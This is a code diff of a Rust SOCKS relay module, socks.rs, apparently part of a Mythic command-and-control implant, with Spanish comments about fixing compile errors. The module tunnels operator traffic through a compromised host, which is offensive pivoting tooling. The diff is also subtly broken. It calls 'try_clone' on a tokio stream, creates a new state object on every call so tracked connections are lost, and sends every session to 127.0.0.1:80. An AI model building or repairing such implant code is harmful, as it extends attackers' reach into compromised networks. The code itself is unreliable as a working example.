@@ -1,9 +1,10 @@
+// socks.rs
 use crate::agent::AgentTask;
 use crate::mythic_continued;
-use base64::alphabet::STANDARD;
+use base64::{engine::general_purpose::STANDARD, Engine};
 use serde::Deserialize;
 use std::error::Error;
-use std::sync::mpsc;
+use std::sync::{mpsc, Arc, Mutex};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 
@@ -14,25 +15,25 @@ pub struct SocksMsg {
     pub data: String,
 }
 
-pub struct SocksState;
-
-pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
-    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
-    Ok(())
+// Define SocksState aquí
+pub struct SocksState {
+    pub connections: Arc<Mutex<Vec<(u32, TcpStream)>>>,
+    pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
 }
+
 impl SocksState {
     pub fn new() -> Self {
         Self {
-            connections: Arc::new(std::sync::Mutex::new(Vec::new())),
-            outbound: Arc::new(std::sync::Mutex::new(Vec::new())),
+            connections: Arc::new(Mutex::new(Vec::new())),
+            outbound: Arc::new(Mutex::new(Vec::new())),
         }
     }
 }
 
+// Asegúrate de que start_socks esté definida correctamente
 pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_removed!(task.id, "success", "SOCKS relay started"))?;
+    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
 
     let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(relay_loop(tx.clone(), rx));
@@ -52,8 +53,9 @@ async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, mut rx: mpsc::Receiver<
 }
 
 async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>) {
-    let mut conns = SocksState::new().connections.lock().unwrap();
-    let mut outbound = SocksState::new().outbound.lock().unwrap();
+    let socks_state = SocksState::new();
+    let mut conns = socks_state.connections.lock().unwrap();
+    let mut outbound = socks_state.outbound.lock().unwrap();
 
     for msg in msgs {
         if msg.exit {
@@ -69,13 +71,17 @@ async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksM
         } else {
             if let Ok(stream) = TcpStream::connect("127.0.0.1:80").await {
                 conns.push((msg.server_id, stream));
-                tokio::spawn(relay_stream(msg.server_id, conns.last().unwrap().1.clone(), tx.clone()));
+                // Clona el stream para pasarlo a relay_stream
+                if let Some((_, ref stream)) = conns.last() {
+                    let stream_clone = stream.try_clone().unwrap();
+                    tokio::spawn(relay_stream(msg.server_id, stream_clone, tx.clone()));
+                }
             }
         }
     }
 
     if !outbound.is_empty() {
-        let json = serde_json::to_string(&outbound).unwrap();
+        let json = serde_json::to_string(&*outbound).unwrap();
         let _ = tx.send(serde_json::json!({
             "command": "socks_data",
             "parameters": json,
